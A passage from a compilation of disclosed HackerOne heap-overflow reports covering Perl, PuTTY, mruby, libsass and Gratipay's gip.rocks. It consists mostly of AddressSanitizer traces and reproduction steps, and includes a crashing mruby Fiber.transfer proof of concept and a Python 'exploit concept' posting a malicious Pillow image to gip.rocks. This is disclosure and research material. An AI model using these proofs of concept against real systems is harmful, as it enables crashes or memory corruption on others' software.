    #0 0x59bc7b in __interceptor_malloc (/home/geeknik/sassc/bin/sassc+0x59bc7b)
    #1 0x7963f9 in Sass::File::read_file(std::string const&) /home/geeknik/libsass/src/file.cpp:411:30
    #2 0x64b255 in Sass::File_Context::parse() /home/geeknik/libsass/src/context.cpp:556:22
    #3 0x5d0650 in Sass::sass_parse_block(Sass_Compiler*) /home/geeknik/libsass/src/sass_context.cpp:227:22
    #4 0x5d0650 in sass_compiler_parse /home/geeknik/libsass/src/sass_context.cpp:476
    #5 0x5cf1d1 in sass_compile_context(Sass_Context*, Sass::Context*) /home/geeknik/libsass/src/sass_context.cpp:364:7
    #6 0x5b9d2e in compile_file /home/geeknik/sassc/sassc.c:145:5

SUMMARY: AddressSanitizer: heap-buffer-overflow /home/geeknik/libsass/src/lexer.hpp:92 char const* Sass::Prelexer::exactly<(char)92>(char const*)
```

---

### [[CVE-2018-18313] regcomp: heap-buffer-overflow read in S_grok_bslash_N](https://hackerone.com/reports/510888)

- **Report ID:** `510888`
- **Severity:** Critical
- **Weakness:** Heap Overflow
- **Program:** Internet Bug Bounty
- **Reporter:** @etsukata
- **Bounty:** - usd
- **Disclosed:** 2019-09-25T01:03:52.921Z
- **CVE(s):** CVE-2018-18313

**Vulnerability Information:**

See: https://rt.perl.org/Public/Bug/Display.html?id=133192
CVE ID: CVE-2018-18313

## Impact

Potential information leak(ex: secret variables or source codes)

---

### [[CVE-2018-18312] regcomp: heap-buffer-overflow write / reg_node overrun](https://hackerone.com/reports/510887)

- **Report ID:** `510887`
- **Severity:** Critical
- **Weakness:** Heap Overflow
- **Program:** Internet Bug Bounty
- **Reporter:** @etsukata
- **Bounty:** - usd
- **Disclosed:** 2019-09-25T01:03:40.705Z
- **CVE(s):** CVE-2018-18312

**Vulnerability Information:**

See: https://rt.perl.org/Public/Bug/Display.html?id=133423
CVE ID: CVE-2018-18312

## Impact

Potential RCE

---

### [Heap overflow happen when receiving short length key from ssh server using ssh protocol 1](https://hackerone.com/reports/630462)

- **Report ID:** `630462`
- **Severity:** High
- **Weakness:** Heap Overflow
- **Program:** PuTTY (European Commission - DIGIT)
- **Reporter:** @hey2baby
- **Bounty:** 3645 usd
- **Disclosed:** 2019-09-20T07:19:41.032Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
There's no check in `ssh1_login_process_queue` function when read `servkey` and `hostkey` length from packet which may cause heap overflow. 
Remote code execution may be possible.

## Steps To Reproduce:
  1. To test this issue, I downloaded openssl6.8 to compile to craft packets, using below command to download openssl6.8p1 source code
`# wget https://openbsd.hk/pub/OpenBSD/OpenSSH/portable/openssh-6.8p1.tar.gz`
 
  2. After download openssl6.8p1 source code, patch `ssh-keygen.c` and `sshd.c` according with `ssh-keygen.c.diff` and `sshd.c.diff` attached accordingly.

  3. Compile patched openssl6.8p1 to get `sshd` which used to act as ssh1 server and `ssh-keygen` to get host key file, using command like below
`# ./ssh-keygen -t rsa1 -b 248 -f /tmp/ssh_host_rsa1_key`
`# /root/openssh-6.8p1/sshd -p 39000 -D -E aaaa -f sshd_config -b 248`
`sshd_config` file should add protocol 1 support and specify host key file path.

  4. Download latest putty source code and compile it using address sanitize flag like below:
`# ./configure CFLAGS="-g -O0 -fsanitize=address" CPPFLAGS="-g -O0 -fsanitize=address" LDFLGAGS="-fsanitize=address"`

  5. After above 4 steps, start plink to connect like below
`# ./plink  -1 -P 39000 root@localhost`

After execution, you will see heap overflow happen immediately like below
 
>=================================================================
==24509== ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60060003b96f at pc 0x45c488 bp 0x7ffc93bd3550 sp 0x7ffc93bd3548
WRITE of size 1 at 0x60060003b96f thread T0
    #0 0x45c487 (/root/putty-0.71/plink+0x45c487)
    #1 0x4ceb78 (/root/putty-0.71/plink+0x4ceb78)
    #2 0x4d23a6 (/root/putty-0.71/plink+0x4d23a6)
    #3 0x4051d5 (/root/putty-0.71/plink+0x4051d5)
    #4 0x40562e (/root/putty-0.71/plink+0x40562e)
    #5 0x53d25a (/root/putty-0.71/plink+0x53d25a)
    #6 0x7f402cfe0c04 (/usr/lib64/libc-2.17.so+0x21c04)
    #7 0x4037f8 (/root/putty-0.71/plink+0x4037f8)
0x60060003b96f is located 0 bytes to the right of 31-byte region [0x60060003b950,0x60060003b96f)
allocated by thread T0 here:
    #0 0x7f402d59b4ba (/usr/lib64/libasan.so.0+0x154ba)
    #1 0x4218b1 (/root/putty-0.71/plink+0x4218b1)
    #2 0x45bf1d (/root/putty-0.71/plink+0x45bf1d)
    #3 0x4ceb78 (/root/putty-0.71/plink+0x4ceb78)
    #4 0x4d23a6 (/root/putty-0.71/plink+0x4d23a6)
    #5 0x4051d5 (/root/putty-0.71/plink+0x4051d5)
    #6 0x40562e (/root/putty-0.71/plink+0x40562e)
    #7 0x53d25a (/root/putty-0.71/plink+0x53d25a)
    #8 0x7f402cfe0c04 (/usr/lib64/libc-2.17.so+0x21c04)
Shadow bytes around the buggy address:
  0x0c013ffff6d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c013ffff6e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c013ffff6f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c013ffff700: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c013ffff710: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x0c013ffff720: fa fa fa fa fd fd fd fa fa fa 00 00 00[07]fa fa
  0x0c013ffff730: 00 00 00 fa fa fa 00 00 00 fa fa fa 00 00 00 fa
  0x0c013ffff740: fa fa 00 00 00 fa fa fa fd fd fd fa fa fa 00 00
  0x0c013ffff750: 00 fa fa fa fd fd fd fa fa fa fd fd fd fa fa fa
  0x0c013ffff760: 00 00 00 00 fa fa 00 00 00 fa fa fa 00 00 00 fa
  0x0c013ffff770: fa fa 00 00 00 fa fa fa 00 00 00 fa fa fa 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:     fa
  Heap righ redzone:     fb
  Freed Heap region:     fd
  Stack left redzone:    f1
  Stack mid redzone:     f2
  Stack right redzone:   f3
  Stack partial redzone: f4
  Stack after return:    f5
  Stack use after scope: f8
  Global redzone:        f9
  Global init order:     f6
  Poisoned by user:      f7
  ASan internal:         fe
==24509== ABORTING

  * [attachment / reference]
attachments contain `sshd.c.diff`, `ssh-keygen.c.diff` and `sshd_config`

## Impact

putty client crash or even remote code execution

---

### [CVE-2018-6797:  A crafted regular expression can cause a heap buffer write overflow in Perl 5 giving a remote attacker control over bytes written](https://hackerone.com/reports/337986)

- **Report ID:** `337986`
- **Severity:** High
- **Weakness:** Heap Overflow
- **Program:** Internet Bug Bounty
- **Reporter:** @geeknik
- **Bounty:** - usd
- **Disclosed:** 2018-05-19T19:00:32.204Z
- **CVE(s):** CVE-2018-6797

**Vulnerability Information:**

An attacker supplies a regular expression containing one or more `\xDF` characters after an escape putting the regexp into unicode matching mode, such as a `\N{}` escape.  Each `\xDF` character adds one byte of overflow, and any other text in the regular expression is written in order, providing the attacker control over the bytes written to the overflowed region.

* Reported to the [Perl security mailing list](https://rt.perl.org/Ticket/Display.html?id=132227) on 6 Oct 2017.
* Confirmed as a security flaw by TonyC on 31 Jan 2018
* CVE-2018-6797 assigned to this flaw on 6 Feb 2018
* Patch released to the security mailing list for Perl 5.24 and Perl 5.26 on 09 Feb 2018
* Patch released to the security mailing list for Perl blead on 22 Feb 2018
* [Public security advisory](https://github.com/Perl/perl5/blob/blead/pod/perl5262delta.pod) released on 14 April 2018

On 31 Jan 2018 Perl dev TonyC says in an email to the Perl security mailing list that `depending on the heap implementation it may be possible to perform a nastier exploit - an attacker has almost complete control over the bytes written.`

```
==28186==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60700000ac58 at pc 0x000000846c2d bp 0x7ffe716bc7f0 sp 0x7ffe716bc7e0
WRITE of size 1 at 0x60700000ac58 thread T0
    #0 0x846c2c in S_regatom /root/perl/regcomp.c:13652
    #1 0x8587f6 in S_regpiece /root/perl/regcomp.c:11708
    #2 0x8587f6 in S_regbranch /root/perl/regcomp.c:11633
    #3 0x88830a in S_reg /root/perl/regcomp.c:11371
    #4 0x8c90dc in Perl_re_op_compile /root/perl/regcomp.c:7363
    #5 0x5297d0 in Perl_pmruntime /root/perl/op.c:5888
    #6 0x74d853 in Perl_yyparse /root/perl/perly.y:1210
    #7 0x58b9b8 in S_parse_body /root/perl/perl.c:2450
    #8 0x593622 in perl_parse /root/perl/perl.c:1753
    #9 0x42eb7d in main /root/perl/perlmain.c:121
    #10 0x7fba4cebe82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
    #11 0x42fe18 in _start (/root/perl/perl+0x42fe18)

0x60700000ac58 is located 0 bytes to the right of 72-byte region [0x60700000ac10,0x60700000ac58)
allocated by thread T0 here:
    #0 0x7fba4dc62602 in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98602)
    #1 0x92dfd4 in Perl_safesysmalloc /root/perl/util.c:153
    #2 0x8c6cbe in Perl_re_op_compile /root/perl/regcomp.c:7209
    #3 0x5297d0 in Perl_pmruntime /root/perl/op.c:5888
    #4 0x74d853 in Perl_yyparse /root/perl/perly.y:1210
    #5 0x58b9b8 in S_parse_body /root/perl/perl.c:2450
    #6 0x593622 in perl_parse /root/perl/perl.c:1753
    #7 0x42eb7d in main /root/perl/perlmain.c:121
    #8 0x7fba4cebe82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)

SUMMARY: AddressSanitizer: heap-buffer-overflow /root/perl/regcomp.c:13652 S_regatom
```

## Impact

Depending on the heap implementation a remote attacker could have complete control over the bytes written to memory.

---

### [Heap Overflow in fiber_switch triggered from Fiber.transfer](https://hackerone.com/reports/227762)

- **Report ID:** `227762`
- **Severity:** High
- **Weakness:** Heap Overflow
- **Program:** shopify-scripts
- **Reporter:** @avisaven
- **Bounty:** - usd
- **Disclosed:** 2017-05-30T14:37:06.630Z
- **CVE(s):** -

**Vulnerability Information:**

It appears as if my recommendations were ignored in the GitHub issue, so I've repeated the issue here.

# PoC

	Fiber.new{}.transfer(
		0,0,0,0,0,0,0,0,0,0,
		0,0,0,0,0,0,0,0,0,0,
		0,0,0,0,0,0,0,0,0,0,
		0,0,0,0,0,0,0,0,0,0,
		0,0,0,0,0,0,0,0,0,0,
		0,0,0,0,0,0,0,0,0,0,
		0,0,0,0,0)

# Explanation
The cause of this is that in mrbgems/mruby-fiber/src/fiber.c the stack Fiber stack is initialized lines 90-96 to a default of 64 (FIBER_STACK_INIT_SIZE), however in fiber_switch lines 191-198, if the Fiber's status is currently MRB_FIBER_CREATED, then it will copy the arguments provided from fiber_transfer irregardless of whether or not there are more arguments than 64 (the PoC doesn't need ~127 arguments, anything 64 or above will work!). The quick fix would be to make sure that theres not more than 64 arguments passed to fiber_transfer.

# Solution

	diff --git a/mrbgems/mruby-fiber/src/fiber.c b/mrbgems/mruby-fiber/src/fiber.c
	index bd1d09d4..2d0fc39a 100644
	--- a/mrbgems/mruby-fiber/src/fiber.c
	+++ b/mrbgems/mruby-fiber/src/fiber.c
	@@ -188,6 +188,9 @@ fiber_switch(mrb_state *mrb, mrb_value self, mrb_int len, const mrb_value *a, mr
	   mrb->c->status = resume ? MRB_FIBER_RESUMED : MRB_FIBER_TRANSFERRED;
	   c->prev = resume ? mrb->c : (c->prev ? c->prev : mrb->root_c);
	   if (c->status == MRB_FIBER_CREATED) {
	+    if (len >= FIBER_STACK_INIT_SIZE) {
	+      mrb_raise(mrb, E_FIBER_ERROR, "too many arguments to fiber");
	+    }
	     mrb_value *b = c->stack+1;
	     mrb_value *e = b + len;

---

### [heap-buffer-overflow (read outside of buffer) in mrb_vm_exec()](https://hackerone.com/reports/221251)

- **Report ID:** `221251`
- **Severity:** High
- **Weakness:** Heap Overflow
- **Program:** shopify-scripts
- **Reporter:** @geeknik
- **Bounty:** - usd
- **Disclosed:** 2017-05-09T12:43:39.447Z
- **CVE(s):** -

**Vulnerability Information:**

Triggered in `3231219` (14 April 2017). Compiled with afl-gcc + asan.

`./mirb < test000`

```
==10555==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200001c920 at pc 0x52be2c bp 0x7ffe6751ada0 sp 0x7ffe6751ad98
READ of size 16 at 0x60200001c920 thread T0
    #0 0x52be2b in mrb_vm_exec /root/mruby/src/vm.c:1556
    #1 0x530a19 in mrb_vm_run /root/mruby/src/vm.c:829
    #2 0x53260f in mrb_run /root/mruby/src/vm.c:2644
    #3 0x53260f in ecall /root/mruby/src/vm.c:320
    #4 0x4fd59f in mrb_vm_exec /root/mruby/src/vm.c:1716
    #5 0x530a19 in mrb_vm_run /root/mruby/src/vm.c:829
    #6 0x53260f in mrb_run /root/mruby/src/vm.c:2644
    #7 0x53260f in ecall /root/mruby/src/vm.c:320
    #8 0x508b65 in mrb_vm_exec /root/mruby/src/vm.c:1170
    #9 0x530a19 in mrb_vm_run /root/mruby/src/vm.c:829
    #10 0x53260f in mrb_run /root/mruby/src/vm.c:2644
    #11 0x53260f in ecall /root/mruby/src/vm.c:320
    #12 0x508b65 in mrb_vm_exec /root/mruby/src/vm.c:1170
    #13 0x530a19 in mrb_vm_run /root/mruby/src/vm.c:829
    #14 0x40781f in main /root/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549
    #15 0x7f93c4ea5b44 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b44)
    #16 0x40a71c (/root/mruby/bin/mirb+0x40a71c)

0x60200001c920 is located 0 bytes to the right of 16-byte region [0x60200001c910,0x60200001c920)
allocated by thread T0 here:
    #0 0x7f93c55849f6 in __interceptor_realloc (/usr/lib/x86_64-linux-gnu/libasan.so.1+0x549f6)
    #1 0x421a2e in mrb_realloc_simple /root/mruby/src/gc.c:202
    #2 0x421a2e in mrb_realloc /root/mruby/src/gc.c:216
    #3 0x421a2e in mrb_malloc /root/mruby/src/gc.c:237

SUMMARY: AddressSanitizer: heap-buffer-overflow /root/mruby/src/vm.c:1556 mrb_vm_exec
```

---

### [Content-Length restriction bypass to heap overflow in gip.rocks.](https://hackerone.com/reports/214449)

- **Report ID:** `214449`
- **Severity:** High
- **Weakness:** Heap Overflow
- **Program:** Gratipay
- **Reporter:** @edoverflow
- **Bounty:** - usd
- **Disclosed:** 2017-03-20T20:17:36.903Z
- **CVE(s):** -

**Vulnerability Information:**

I started playing around with a0xnirudh's [Content-Length restriction bypass](https://hackerone.com/reports/203388) and noticed that when combined with a different vulnerability  this could be leveraged to do a bit more than DoS.

We decided to open a new ticket to address this issue, since [we were already aware of the bypass](https://github.com/gratipay/gip.rocks/issues/2). a0xnirudh wrote such a good report that we decided to not close their report as a `Duplicate`.

# Summary
---

I noticed that `gip.rocks` was using an outdated version (2.9.0) of the Pillow framework which is vulnerable to heap overflows. The test playoad is 788480 bytes. So the bypass allowed me to pass the payload on to the vulnerable code.

~~~python
>>> import os
>>> os.path.getsize('payload.pcd')
788480L
~~~

# PoC
---

Vulnerable code in `www/v1.st` summarised:

~~~python
>>> from PIL import Image
>>> image = Image.open('foo.jpg')
>>> image.resize((foo, bar))
~~~

Summarised exploit:

~~~python
>>> from PIL import Image
>>> image = Image.open('payload.pcd')
>>> image.resize((128, 128))
~~~

Exploit concept:

~~~python
import requests
r = requests.post(  'http://gip.rocks/v1', 
                    data = open('payload.pcd').read(), 
                    headers = { 
                        'Content-Type': 'image/jpeg',
                        'Content-Length': ' ' # Insert a value smaller than 262144
                    }
                  )
print(r.status_code, r.reason)
~~~

# Fix
---

I have submitted a PR to solve the heap overflow vulnerability: https://github.com/gratipay/gip.rocks/pull/5

---
